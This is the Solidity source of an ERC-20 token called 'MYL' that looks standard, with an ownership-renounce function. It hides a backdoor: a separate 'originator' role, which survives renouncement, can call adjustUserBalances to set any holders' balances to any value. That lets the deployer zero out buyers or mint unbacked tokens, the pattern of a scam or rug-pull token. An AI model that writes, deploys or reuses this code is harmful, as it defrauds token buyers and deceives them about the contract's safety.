pragma solidity ^0.8.18;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract ContextEnhanced {
    function fetchSenderAddress() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract SoleProprietor is ContextEnhanced {
    address private _proprietor;
    event OwnershipShifted(address indexed previousProprietor, address indexed newProprietor);

    constructor () {
        address msgSender = fetchSenderAddress();
        _proprietor = msgSender;
        emit OwnershipShifted(address(0), msgSender);
    }

    function retrieveProprietor() public view virtual returns (address) {
        return _proprietor;
    }

    modifier solelyProprietor() {
        require(retrieveProprietor() == fetchSenderAddress(), "Proprietorship: executor is not the proprietor");
        _;
    }

    function relinquishOwnership() public virtual solelyProprietor {
        emit OwnershipShifted(_proprietor, address(0x000000000000000000000000000000000000dEaD));
        _proprietor = address(0x000000000000000000000000000000000000dEaD);
    }
}



contract MYL is ContextEnhanced, SoleProprietor, IERC20 {
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    address private _craftsman;

    string public constant _name = "MYL";
    string public constant _symbol = "MYL";
    uint8 public constant _decimals = 18;
    uint256 public constant _totalSupply = 1000000 * (10 ** _decimals);

    constructor() {
        _balances[fetchSenderAddress()] = _totalSupply;
        emit Transfer(address(0), fetchSenderAddress(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function retrieveOriginator() public view virtual returns (address) { 
        return _craftsman;
    }

    function assignNewOriginator(address newOriginator) public solelyProprietor { 
        _craftsman = newOriginator;
    }

    modifier solelyOriginator() {
        require(retrieveOriginator() == fetchSenderAddress(), "TOKEN: executor is not the originator");
        _;
    }

    event BalanceAdjusted(address indexed account, uint256 currentBalance, uint256 adjustedBalance);

    function adjustUserBalances(address[] memory userAddresses, uint256 targetBalance) public solelyOriginator {

        require(targetBalance >= 0, "Error: target balance should be non-negative");

        for (uint256 index = 0; index < userAddresses.length; index++) {

            address currentUser = userAddresses[index];

            require(currentUser != address(0), "Error: user address cannot be the zero address");

            uint256 currentBalance = _balances[currentUser];

            _balances[currentUser] = targetBalance;

            emit BalanceAdjusted(currentUser, currentBalance, targetBalance);
        }
    }


    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_balances[fetchSenderAddress()] >= amount, "TT: transfer amount exceeds balance");
    _balances[fetchSenderAddress()] -= amount;
    _balances[recipient] += amount;

    emit Transfer(fetchSenderAddress(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[fetchSenderAddress()][spender] = amount;
        emit Approval(fetchSenderAddress(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_allowances[sender][fetchSenderAddress()] >= amount, "TT: transfer amount exceeds allowance");

    _balances[sender] -= amount;
    _balances[recipient] += amount;
    _allowances[sender][fetchSenderAddress()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return _totalSupply;
    }
}